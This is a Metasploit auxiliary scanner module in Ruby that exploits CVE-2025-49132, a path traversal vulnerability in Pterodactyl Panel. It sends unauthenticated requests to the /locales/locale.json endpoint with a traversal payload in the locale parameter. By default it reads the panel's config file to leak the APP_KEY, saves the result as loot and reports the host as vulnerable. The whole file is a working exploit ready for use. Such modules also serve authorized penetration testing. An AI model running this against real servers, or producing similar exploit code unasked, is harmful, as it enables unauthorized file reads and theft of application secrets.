##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Pterodactyl Panel Path Traversal (CVE-2025-49132)',
        'Description'    => %q{
          This module exploits a path traversal vulnerability in Pterodactyl Panel.
          The vulnerability exists in the /locales/locale.json endpoint, allowing
          unauthenticated attackers to read arbitrary files on the server.
          By default, it attempts to read the 'config' file to leak the APP_KEY.
        },
        'Author'         => [ 'N05ec' ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['CVE', '2025-49132']
        ],
        'DisclosureDate' => '2025-06-20',
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the locale endpoint', '/locales/locale.json']),
        OptInt.new('DEPTH', [true, 'The traversal depth', 2]),
        OptString.new('FILE', [true, 'The file to read', 'config'])
      ]
    )
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILE']
    payload = "#{traversal}#{filename}"

    vprint_status("Attempting to retrieve #{filename} with depth #{datastore['DEPTH']}...")

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path),
      'vars_get' => {
        'locale'    => payload,
        'namespace' => 'app'
      }
    })

    unless res
      print_error("#{peer} - Connection failed (No response)")
      return
    end

    if res.code == 200
      if res.body.include?('{"app":{"version":') && res.body.include?('"key":"base64')
        print_good("#{peer} - Vulnerable! Found Pterodactyl configuration.")
        
        path = store_loot(
          'pterodactyl.config',
          'application/json',
          ip,
          res.body,
          filename,
          'Pterodactyl Panel Config'
        )
        print_good("#{peer} - Config saved to: #{path}")

        report_vuln(
          host: ip,
          name: self.name,
          refs: self.references,
          info: "Retrieved #{filename} via CVE-2025-49132"
        )
      else
        print_status("#{peer} - Connected (200 OK), but response did not contain expected config patterns.")
        vprint_line(res.body)
      end
    else
      print_error("#{peer} - Server responded with #{res.code}")
    end

  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    print_error("#{peer} - Connection failed")
  rescue => e
    print_error("#{peer} - Unexpected error: #{e.message}")
  end
end
